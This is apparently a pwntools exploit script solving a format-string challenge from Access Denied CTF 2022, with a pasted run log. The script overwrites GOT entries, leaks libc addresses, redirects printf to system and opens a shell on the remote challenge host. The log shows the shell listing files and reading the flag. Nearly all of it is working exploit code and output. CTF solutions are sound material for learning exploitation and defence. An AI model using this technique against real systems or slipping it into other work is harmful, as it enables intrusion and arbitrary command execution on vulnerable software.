from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './format'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "107.178.209.165"
  PORT = 9337
  s = remote(HOST, PORT)
  libc = ELF("./libc.so.6")
else:
  s = process(BINARY)
  libc = elf.libc

index = 6

a0 = elf.sym.main&0xffff
a1 = (elf.sym.main>>16)&0xffff
a1 = ((a1-a0-1) % 0x10000) + 1
a0 = ((a0-1) % 0x10000) + 1

buf  = "%%%dc%%%d$hn" % (a0, index+4)
buf += "%%%dc%%%d$hn" % (a1, index+5)
buf += "-%12$s"
buf += "-"*(8-len(buf)%8)
buf += p64(elf.got.puts) 
buf += p64(elf.got.puts+2)
buf += p64(elf.got.read) 
s.sendlineafter("Enter your name\n", buf)

s.recvuntil("-")
read_addr = u64(s.recvuntil("-")[:-1] + "\x00\x00")
libc_base   = read_addr - libc.sym.read
system_addr = libc_base + libc.sym.system

print "read_addr   =", hex(read_addr)
print "libc_base   =", hex(libc_base)
print "system_addr =", hex(system_addr)

a0 = system_addr&0xffff
a1 = (system_addr>>16)&0xffff
a1 = ((a1-a0-1) % 0x10000) + 1
a0 = ((a0-1) % 0x10000) + 1

buf  = "%%%dc%%%d$hn" % (a0, index+4)
buf += "%%%dc%%%d$hn" % (a1, index+5)
buf += "-"*(8-len(buf)%8)
buf += p64(elf.got.printf) 
buf += p64(elf.got.printf+2)
s.sendlineafter("Enter your name\n", buf)

s.sendline("/bin/sh\x00")

s.interactive()


'''
mito@ubuntu:~/CTF/Access_Denied_CTF_2022/Pwn_format/format$ python solve.py r
[*] '/home/mito/CTF/Access_Denied_CTF_2022/Pwn_format/format/format'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[x] Opening connection to 107.178.209.165 on port 9337
[x] Opening connection to 107.178.209.165 on port 9337: Trying 107.178.209.165
[+] Opening connection to 107.178.209.165 on port 9337: Done
[*] '/home/mito/CTF/Access_Denied_CTF_2022/Pwn_format/format/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
read_addr   = 0x7f5d1ada5020
libc_base   = 0x7f5d1ac95000
system_addr = 0x7f5d1ace4420
[*] Switching to interactive mode

              @-------0@@sh: 1: Enter: not found
$ id
/bin/sh: 1: id: not found
$ ls -l
total 44
drwxr-x--- 1 0 1000  4096 Jun 10 11:41 bin
drwxr-x--- 1 0 1000  4096 Jun 10 11:41 dev
-rwxr----- 1 0 1000    51 Jun 11 06:51 flag.txt
-rwxr-x--- 1 0 1000 16960 Jun 11 06:45 format
drwxr-x--- 1 0 1000  4096 Jun 10 11:41 lib
drwxr-x--- 1 0 1000  4096 Jun 10 11:41 lib32
drwxr-x--- 1 0 1000  4096 Jun 10 11:41 lib64
$ cat flag.txt
accessdenied{f0rm4t_str1n9_sh3ll_3xpl01t_939d562c}
'''
